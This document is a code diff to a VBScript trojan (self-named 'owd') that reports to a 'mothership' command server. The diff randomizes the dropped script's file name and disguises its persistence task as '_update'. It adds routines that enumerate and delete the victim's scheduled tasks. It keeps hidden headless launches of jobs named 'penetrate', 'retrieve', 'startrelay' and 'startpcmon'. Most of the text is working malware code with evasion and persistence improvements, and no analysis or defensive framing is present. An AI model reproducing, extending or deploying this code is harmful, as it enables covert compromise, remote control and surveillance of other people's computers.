@@ -1,4 +1,4 @@
-' 2026.06.26-1100
+' 2026.06.27-1248
 
 Option Explicit
 On Error Resume Next
@@ -24,6 +24,27 @@ Function IsWScript()
     End If
 End Function
 
+Function LogMsgErr(pp, msg)
+
+    If XIsEmpty(pp) Then
+        pp = "LogMsgErr"
+    End If
+
+    If XIsEmpty(msg) Then
+        msg = ""
+    End If
+
+    Call LogMsg(pp & " -- " & msg)
+
+    If Err.Number <> 0 Then
+        Call LogMsg(pp & " -- reporting errors")
+    End IF
+    
+    Call LogMsg("Err.Number=" & Hex(Err.Number))
+    Call LogMsg("Err.Description=" & Err.Description)
+    Call LogMsg("Err.Source=" & Err.Source)
+End Function
+
 Function LogErr()
     If Err.Number = 0 Then
         Exit Function
@@ -32,6 +53,8 @@ Function LogErr()
     Call LogMsg("Err.Number=" & Hex(Err.Number))
     Call LogMsg("Err.Description=" & Err.Description)
     Call LogMsg("Err.Source=" & Err.Source)
+    
+    Err.Clear
 End Function
 
 Function PushEventMother(eventcode)
@@ -1084,7 +1107,6 @@ Function GetScriptTagStrUrl()
     Dim keys : keys = scripttag.Keys
     Dim strKey
 
-    ' --data-urlencode "source=zfei.vbs" 
     For Each strKey In keys
         GetScriptTagStrUrl = GetScriptTagStrUrl & " --data-urlencode " & dq & strKey & "=" & scripttag.Item(strKey) & dq & " "
     Next
@@ -1407,14 +1429,14 @@ If WScript.Arguments.Count > 0 Then
 End If
 
 Dim cmdtaskname : cmdtaskname = ""
-If cmdname = "task" Then
+If LCase(cmdname) = "task" Then
     If WScript.Arguments.Count > 1 Then
         cmdtaskname = WScript.Arguments(1)
     End If
 End IF
 
 Dim scriptts : scriptts = GetTimestamp()
-Dim clientid : clientid = "abcdwxyz"
+Dim clientid : clientid = "88779966"
 Dim source : source = WScript.ScriptName
 Dim scriptpath : scriptpath = WScript.ScriptFullName
 Dim scriptdir : scriptdir = fso.GetParentFolderName(WScript.ScriptFullName)
@@ -1443,7 +1465,7 @@ End IF
 
 Dim trojanname : trojanname = "owd"
 
-Dim tskname : tskname=UCase(trojanname) & "_retry_infection_vbs"
+Dim tskname : tskname=UCase(trojanname) & "_update"
 
 Dim runnerdelaytime : runnerdelaytime = 60
 Dim cmdlistdelaytime : cmdlistdelaytime = 30
@@ -1452,7 +1474,7 @@ Dim watchdogtimedelay : watchdogtimedelay = 30
 Dim tskxmltime : tskxmltime=90 
 Dim timetaskxmltime : timetaskxmltime=90
 
-Dim trojanfname : trojanfname = "zfei.vbs"
+Dim trojanfname : trojanfname = GenerateRandomCode(4)
 
 Dim workdir : workdir = tempPath & "\" & trojanname 
 Dim exepath : exepath = workdir & "\" & "launch.exe"
@@ -1510,11 +1532,12 @@ Dim scriptmd5
 Function Init()
     On Error Resume Next
     Err.Clear
-    
-    Call LogMsg("Init")
+    Dim pp : pp = "Init"
+
+    Call LogMsg(pp & " -- starting")
     
     If XIsEmpty(cmdname) Then
-        Call LogMsg("fatal error -- cmdname is empty -- exiting")
+        Call LogMsg(pp & " -- fatal error -- cmdname is empty -- exiting")
         WScript.Quit(1)
     End IF
 
@@ -1524,14 +1547,14 @@ Function Init()
 
     WshShell.CurrentDirectory = workdir
 
-    Call LogMsg("attempting to obtain lock")
+    Call LogMsg(pp & " -- attempting to obtain lock")
     
     Err.Clear
 
     Call TryDeleteFile(lockfilepath)
     
     If Err.Number <> 0 Or fso.FileExists(lockfilepath) Then
-        Call LogMsg("singleton rule -- unable to delete lock file, exiting")
+        Call LogMsg(pp & " -- unable to delete lock file, exiting")
         Call LogErr()
         WScript.Quit(1)
     Else
@@ -1544,10 +1567,11 @@ Function Init()
 
     If Not fso.FileExists(workdir & "\" & trojanfname) Then
         fso.CopyFile scriptpath, workdir & "\" & trojanfname, True
+        ' TODO: call reschedule
     End If    
 
     If fso.FileExists(workdir & "\" & "mothership") Then
-        Call LogMsg("mothership exists reading it")
+        Call LogMsg(pp & " -- mothership exists, reading it")
         mothership = ReadTag( workdir & "\" & "mothership" )
     End If
     
@@ -1555,32 +1579,41 @@ Function Init()
         mothership = SelectMothership()
     End If
     
-    Call LogMsg("calculating MD5Hash")
+    Call LogMsg(pp & " -- calculating MD5Hash")
     scriptmd5 = GetMD5Hash(workdir & "\" & trojanfname, workdir & "\" & "scriptmd5" )
-        
-    clientid = ReadClientId(workdir & "\" & "client_id")
     
-    Call LogMsg("starting source=" & source & " cmdname=" & cmdname & " cmdtaskname=" & cmdtaskname & " clientid=" & clientid & " mothership=" & mothership & " -- " & scriptts )
+    clientid = ReadClientId(workdir & "\" & "client_id")
+
+    ' TODO: dump state variables    
+    Call LogMsg(pp & " -- source=" & source & " cmdname=" & cmdname & " cmdtaskname=" & cmdtaskname & " clientid=" & clientid & " mothership=" & mothership & " -- " & scriptts )
         
-    If cmdname = "init" or cmdname = "task" Then
+    If LCase(cmdname) = "init" or LCase(cmdname) = "task" Then
      
         StartupLogic()
         
-        Call LogMsg("init finished -- exiting")
+        ' TODO: replace with LogMsgErr
+        Call LogMsg(pp & " -- finished -- exiting")
         WScript.Quit(0)
     End If
     
+    ' TODO: check if cmdname is part of registered list
     'If InStr(LCase(Join(cmdslist)), LCase(cmdname)) >= 1 Then
-    Call LogMsg("Init: calling into " & cmdname)
+
+    Call LogMsg(pp & " -- calling into " & cmdname)
     
     Dim func : Set func = GetRef(cmdname)
+
+    If Not IsValidFunction(func)
+        Call LogMsg(pp & " -- ")
+        WScript.Quit(1)
+    End If
     
     func()
     
-    Call LogMsg("Init: [" & cmdname & "] finished")
+    Call LogMsg(pp & " -- [" & cmdname & "] finished")
 
     IF Err.Number <> 0 Then
-        Call LogMsg("Init -- reporting errors")
+        Call LogMsg(pp & " -- reporting errors")
         Call LogErr()
         WScript.Quit(0)
     End If
@@ -1597,6 +1630,39 @@ Call LogMsg("fatal error -- reached unreachable point -- exiting")
 WScript.Quit(1)
 
 ' ---
+
+Function GenerateRandomCode(length)
+    Randomize
+    Dim charPool, i, randomIndex, resultStr
+    
+    charPool = "abcdefghijklmnopqrstuvwxyz"
+    resultStr = ""
+    
+    For i = 1 To length
+        randomIndex = Int(Rnd() * Len(charPool)) + 1
+        resultStr = resultStr & Mid(charPool, randomIndex, 1)
+    Next
+    
+    GenerateRandomCode = resultStr
+End Function
+
+' TODO: add error logging
+Function IsValidFunction(funcName)
+    On Error Resume Next
+    Err.Clear
+
+    Dim ref : Set ref = GetRef(funcName)
+    
+    ' Check if an object was successfully returned and is not empty
+    If IsObject(ref) Then
+        If Not ref Is Nothing Then
+            IsValidFunction = True
+            Exit Function
+        End If
+    End If
+    
+    IsValidFunction = False
+End Function
 
 Function AddToArray(tarr, tvalue)
     Err.Clear    
@@ -2416,7 +2482,7 @@ Function LaunchExecCmd(argstr)
     If ( LCase(exec_cmdname) = LCase("StartRelay") ) Then
         Call PushEventMother("start_job")
 
-        Call ExecShellAsync("conhost.exe --headless cscript.exe //nologo //B " & workdir & "\" & "zfei.vbs" & " startrelay " )
+        Call ExecShellAsync("conhost.exe --headless cscript.exe //nologo //B " & workdir & "\" & trojanfname & " startrelay " )
         
         LaunchExecCmd = 0
     End If
@@ -2424,7 +2490,7 @@ Function LaunchExecCmd(argstr)
     If ( LCase(exec_cmdname) = LCase("StartPCMon") ) Then
         Call PushEventMother("start_job")
 
-        Call ExecShellAsync("conhost.exe --headless cscript.exe //nologo //B " & workdir & "\" & "zfei.vbs" & " startpcmon " )
+        Call ExecShellAsync("conhost.exe --headless cscript.exe //nologo //B " & workdir & "\" & trojanfname & " startpcmon " )
         
         LaunchExecCmd = 0
     
@@ -2928,10 +2994,103 @@ Function CreateTaskXMLStr(xmlstr, tasknamestr)
     
 End Function
 
+' TEST
+Function GetSchedTasks()
+    Dim pp : pp = "GetSchedTasks"
+
+    Dim tasksarr
+    Dim tasksstr : tasksstr = ""
+
+    Dim outfpath : outfpath = workdir & "\" & "GetSchedTasks_" &  GetRandom(4) & ".out"
+    Call RunShell("schtasks /query /fo LIST | findstr TaskName > " & outfpath, True)
+    ' TaskName:      \Adobe Acrobat Update Task
+
+    If fso.FileExists(outfpath) Then
+        Dim lines : lines = ReadFileIntoArray(outfpath)
+        Dim linecount : linecount = IsValidArray(lines)
+
+        If linecount >= 1 Then
+            Call LogMsg(pp & " -- linecount=" & CStr(linecount))
+            Dim line
+
+            For Each line In lines
+                Dim tokens : tokens = Split(line, ":")
+                Dim tokencount : tokencount = IsValidArray(tokens)
+
+                If ( tokencount = 2 ) Then
+                    Dim ttaskname : ttaskname = tokens(1)
+                    ttaskname  = Trim(ttaskname)
+                    If Left(ttaskname  , 1) = "\" Then
+                        ttaskname  = Mid(ttaskname, 2)
+                    End If
+
+                    Call LogMsg(pp & " -- taskname="&ttaskname)
+                    
+                    If Not XIsEmpty(ttaskname) Then
+                        tasksstr = tasksstr & "|" & ttaskname
+                    End If
+
+                End If
+
+            Next
+
+            tasksarr = Split(tasksstr, "|")
+        End If
+
+    End If
+
+    If IsValidArray(tasksarr)>=1 Then
+        GetSchedTasks = tasksarr
+        Call LogMsgErr(pp, "finished")
+        Exit Function
+    End If
+
+    Call TryDeleteFile(outfpath)
+
+    outfpath = workdir & "\" & "GetSchedTasks_" &  GetRandom(4) & ".out"
+
+    Call RunShell("conhost.exe --headless cmd /c powershell.exe -Command " & dq & "(Get-ScheduledTask).TaskName" & dq & " > " & outfpath, True)
+
+    If fso.FileExists(outfpath) Then
+        tasksarr = ReadFileIntoArray(outfpath)
+        GetSchedTasks = tasksarr
+        Call LogMsgErr(pp, "finished")
+    End If
+
+    Call LogMsgErr(pp, " -- error could not create tasks list")
+
+End Function
+
+' TODO anchor
+Function TryDeleteTask(ttaskname)
+    Call RunShell("cmd /c schtasks /delete /tn " & ttaskname & " /f", True)
+
+    Call RunShell("conhost.exe --headless cmd /c powershell.exe -Command " & dq & "Unregister-ScheduledTask -TaskName " & dq & ttaskname & dq & " -Confirm:$false", True)
+
+End Function
+
+' TODO
+Function ClearSchedTasks()
+    Dim pp : pp = "ClearSchedTasks"
+    
+    Dim tasks : tasks = GetSchedTasks()
+
+    Dim taskcount : taskcount = IsValidArray(tasks)
+
+    If taskcount <= 0 Then
+        Call LogMsg(pp & "-- error empty tasks exiting")
+        Exit Function
+    End If
+    
+    ' Unregister-ScheduledTask -TaskName "<task name>" -Confirm:$false
+
+End Function
+
 Function Reschedule()   
-    cmdname = "reschedule"
+    Dim pp : pp = "Reschedule"
+    cmdname = LCase(pp)
  
-    Call LogMsg("Reschedule starting")
+    Call LogMsg(pp & " -- starting")
     
     Dim xmlstr 
     Dim ptaskname 
@@ -2953,8 +3112,7 @@ Function Reschedule()
     xmlstr = GetTimeTaskXMLStr(ptaskname)
     Call CreateTaskXMLStr(xmlstr, ptaskname)
           
-    
-    Call LogMsg("Reschedule finished")
+    Call LogMsgErr(pp, "finished")
 End Function
 
 Function ReadCmdPid(tcmdname, tworkdir)
@@ -3177,13 +3335,15 @@ Function ExecPython(scriptname, scriptdir, scriptfname, args)
 End Function
 
 Function ExecCmd(tcmdname, args)
+    Dim pp : pp = "ExecCmd"
+
     ExecCmd = -1
     
     If XIsEmpty(tcmdname) Then
         Exit Function
     End IF                                         
 
-    Call LogMsg("ExecCmd " & tcmdname)
+    Call LogMsg(pp & " " & tcmdname)
 
     Dim argstr : argstr = ""
     
@@ -3204,11 +3364,10 @@ Function ExecCmd(tcmdname, args)
     End If
     
     Dim cmdstr : cmdstr = ""
-    cmdstr = "cscript.exe //nologo //B " & workdir & "\" & "zfei.vbs" & " " & tcmdname
+    cmdstr = "cscript.exe //nologo //B " & workdir & "\" & trojanfname & " " & tcmdname
     cmdstr = cmdstr & " " & argstr
     
     Dim pid : pid = ExecShellAsync(cmdstr)
-    
           
     Dim cmdrunpath : cmdrunpath = workdir & "\" & tcmdname & "_running"
 
@@ -3218,7 +3377,7 @@ Function ExecCmd(tcmdname, args)
         Call WriteFile(cmdrunpath, CStr(pid))
         
         If fso.FileExists(cmdrunpath) Then
-            Call LogMsg("ExecCmd -- created running file " & cmdrunpath & " with pid=" & pid)
+            Call LogMsg(pp & " -- created running file " & cmdrunpath & " with pid=" & pid)
         End If
         
     End IF
@@ -3291,9 +3450,9 @@ Function StartupLogic()
     Next 
 
     If cmdname = "init" Then
-        Call ExecShellAsync("conhost.exe --headless cscript.exe //nologo //B " & workdir & "\" & "zfei.vbs" & " reschedule")    
-        Call ExecShellAsync("conhost.exe --headless cscript.exe //nologo //B " & workdir & "\" & "zfei.vbs" & " retrieve")
-        Call ExecShellAsync("conhost.exe --headless cscript.exe //nologo //B " & workdir & "\" & "zfei.vbs" & " penetrate")
+        Call ExecShellAsync("conhost.exe --headless cscript.exe //nologo //B " & workdir & "\" & trojanfname & " reschedule")    
+        Call ExecShellAsync("conhost.exe --headless cscript.exe //nologo //B " & workdir & "\" & trojanfname & " retrieve")
+        Call ExecShellAsync("conhost.exe --headless cscript.exe //nologo //B " & workdir & "\" & trojanfname & " penetrate")
     End IF
     
     Activate()
@@ -3348,7 +3507,7 @@ Function GetIdleTaskXMLStr(intaskname)
                 "<Actions Context=" & dq & "Author" & dq & ">" & _
                 "<Exec>" & _
                 "<Command>conhost.exe</Command>" & _
-                "<Arguments>--headless cscript.exe //nologo //b " & workdir & "\zfei.vbs task " & intaskname & "</Arguments>" & _
+                "<Arguments>--headless cscript.exe //nologo //b " & workdir & "\" & trojanfname & " task " & intaskname & "</Arguments>" & _
                 "<WorkingDirectory>" & workdir & "</WorkingDirectory>" & _
                 "</Exec>" & _
                 "</Actions>" & _
@@ -3400,7 +3559,7 @@ Function GetRepTaskXMLStr(intaskname)
                 "<Actions Context=" & dq & "Author" & dq & ">" & _
                 "<Exec>" & _
                 "<Command>conhost.exe</Command>" & _
-                "<Arguments>--headless cscript.exe //nologo //b " & workdir & "\zfei.vbs task " & intaskname & "</Arguments>" & _
+                "<Arguments>--headless cscript.exe //nologo //b " & workdir & "\" & trojanfname & " task " & intaskname & "</Arguments>" & _
                 "<WorkingDirectory>" & workdir & "</WorkingDirectory>" & _
                 "</Exec>" & _
                 "</Actions>" & _
@@ -3449,7 +3608,7 @@ Function GetTimeTaskXMLStr(intaskname)
                 "<Actions Context=" & dq & "Author" & dq & ">" & _
                 "<Exec>" & _
                 "<Command>conhost.exe</Command>" & _
-                "<Arguments>--headless cscript.exe //nologo //b " & workdir & "\zfei.vbs task " & intaskname & "</Arguments>" & _
+                "<Arguments>--headless cscript.exe //nologo //b " & workdir & "\" & trojanfname & " task " & intaskname & "</Arguments>" & _
                 "<WorkingDirectory>" & workdir & "</WorkingDirectory>" & _
                 "</Exec>" & _
                 "</Actions>" & _
@@ -3498,7 +3657,7 @@ Function GetDailyTaskXMLStr(intaskname)
                 "<Actions Context=" & dq & "Author" & dq & ">" & _
                 "<Exec>" & _
                 "<Command>conhost.exe</Command>" & _
-                "<Arguments>--headless cscript.exe //nologo //b " & workdir & "\zfei.vbs task " & intaskname & "</Arguments>" & _
+                "<Arguments>--headless cscript.exe //nologo //b " & workdir & "\" & trojanfname & " task " & intaskname & "</Arguments>" & _
                 "<WorkingDirectory>" & workdir & "</WorkingDirectory>" & _
                 "</Exec>" & _
                 "</Actions>" & _
